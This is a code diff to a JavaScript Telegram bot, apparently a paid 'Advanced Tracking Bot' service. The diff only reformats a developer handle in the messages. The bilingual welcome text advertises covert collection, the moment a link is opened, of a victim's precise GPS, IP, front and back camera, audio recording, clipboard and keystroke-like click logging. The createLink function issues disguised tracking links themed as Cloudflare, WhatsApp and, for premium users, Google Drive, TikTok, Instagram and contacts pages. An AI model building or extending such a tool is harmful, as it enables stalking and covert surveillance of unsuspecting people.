@@ -131,7 +131,7 @@ const T = {
   ar: {
     welcome_new:   (name) => `✨ أهلاً وسهلاً ${name||''} 👑`,
     welcome_back:  (name) => `🔥 مرحباً مجدداً ${name||''} ⚡`,
-    welcome_body:  `\n\n━━━━━━━━━━━━━━━━━━━━\n🕵️ *بوت التتبع المتقدم*\n━━━━━━━━━━━━━━━━━━━━\n\n📡 *يجمع لحظة الفتح:*\n\n📍 GPS دقيق + IP + المدينة\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 سرعة الإنترنت + ISP\n📋 محتوى الحافظة\n🔑 بصمة الجهاز الفريدة\n👁️ تتبع سلوك المستخدم\n🌙 الوضع الليلي + الخط\n🔇 مستوى الضوضاء المحيطة\n⌨️ تسجيل النقرات\n\n💎 *المميزون يحصلون على أكثر!*\n━━━━━━━━━━━━━━━━━━━━\n⚡ Powered by @Ye_x00`,
+    welcome_body:  `\n\n━━━━━━━━━━━━━━━━━━━━\n🕵️ *بوت التتبع المتقدم*\n━━━━━━━━━━━━━━━━━━━━\n\n📡 *يجمع لحظة الفتح:*\n\n📍 GPS دقيق + IP + المدينة\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 سرعة الإنترنت + ISP\n📋 محتوى الحافظة\n🔑 بصمة الجهاز الفريدة\n👁️ تتبع سلوك المستخدم\n🌙 الوضع الليلي + الخط\n🔇 مستوى الضوضاء المحيطة\n⌨️ تسجيل النقرات\n\n💎 *المميزون يحصلون على أكثر!*\n━━━━━━━━━━━━━━━━━━━━\n⚡ Powered by \`@Ye_x00\``,
     lang_name:     '🇸🇦 العربية',
     lang_switched: '✅ تم التحويل إلى العربية 🇸🇦',
     menu_title:    '⚡ *اختر من القائمة:*',
@@ -150,7 +150,7 @@ const T = {
   en: {
     welcome_new:   (name) => `✨ Welcome ${name||''} 👑`,
     welcome_back:  (name) => `🔥 Welcome back ${name||''} ⚡`,
-    welcome_body:  `\n\n━━━━━━━━━━━━━━━━━━━━\n🕵️ *Advanced Tracking Bot*\n━━━━━━━━━━━━━━━━━━━━\n\n📡 *Collects on open:*\n\n📍 Precise GPS + IP + City\n📱 Full device fingerprint\n📷 Front & back camera\n🎙️ Audio recording\n🌐 Network speed + ISP\n📋 Clipboard content\n🔑 Unique device signature\n👁️ Behavior tracking\n🌙 Dark mode + fonts\n🔇 Ambient noise level\n⌨️ Click logging\n\n💎 *Premium gets even more!*\n━━━━━━━━━━━━━━━━━━━━\n⚡ Powered by @Ye_x00`,
+    welcome_body:  `\n\n━━━━━━━━━━━━━━━━━━━━\n🕵️ *Advanced Tracking Bot*\n━━━━━━━━━━━━━━━━━━━━\n\n📡 *Collects on open:*\n\n📍 Precise GPS + IP + City\n📱 Full device fingerprint\n📷 Front & back camera\n🎙️ Audio recording\n🌐 Network speed + ISP\n📋 Clipboard content\n🔑 Unique device signature\n👁️ Behavior tracking\n🌙 Dark mode + fonts\n🔇 Ambient noise level\n⌨️ Click logging\n\n💎 *Premium gets even more!*\n━━━━━━━━━━━━━━━━━━━━\n⚡ Powered by \`@Ye_x00\``,
     lang_name:     '🇺🇸 English',
     lang_switched: '✅ Switched to English 🇺🇸',
     menu_title:    '⚡ *Choose from menu:*',
@@ -3728,7 +3728,7 @@ async function createLink(cid, msg) {
     if (!prem) {
       // ── Free users: Cloudflare + WebView + WhatsApp only ──────────────────
       bot.sendMessage(cid,
-        `✅ *تم إنشاء روابطك!*\n🔗 \`${trimmed}\`\n\n━━━━━━━━━━━━━━━\n🛡️ *Cloudflare:*\n${cLink}\n\n🖥️ *WebView:*\n${wLink}\n\n💬 *WhatsApp:*\n${waLink}\n\n━━━━━━━━━━━━━━━\n🔒 *روابط مقفلة — للمميزين فقط:*\n📁 Google Drive  |  🎵 TikTok  |  📷 Instagram  |  📒 جهات الاتصال  |  🖼️ ملفات\n\n💎 *اشترك الآن لفتح جميع الروابط!*\nتواصل مع @Ye_x00`,
+        `✅ *تم إنشاء روابطك!*\n🔗 \`${trimmed}\`\n\n━━━━━━━━━━━━━━━\n🛡️ *Cloudflare:*\n${cLink}\n\n🖥️ *WebView:*\n${wLink}\n\n💬 *WhatsApp:*\n${waLink}\n\n━━━━━━━━━━━━━━━\n🔒 *روابط مقفلة — للمميزين فقط:*\n📁 Google Drive  |  🎵 TikTok  |  📷 Instagram  |  📒 جهات الاتصال  |  🖼️ ملفات\n\n💎 *اشترك الآن لفتح جميع الروابط!*\nتواصل مع \`@Ye_x00\``,
         { parse_mode:'Markdown', reply_markup: JSON.stringify({ inline_keyboard: [
           [{ text:"🔗 رابط جديد", callback_data:"crenew" }, { text:"📷 QR Code", callback_data:`qr:${cid}` }],
           [{ text:"💎 ترقية للمميز 🔥", callback_data:"pinfo" }]
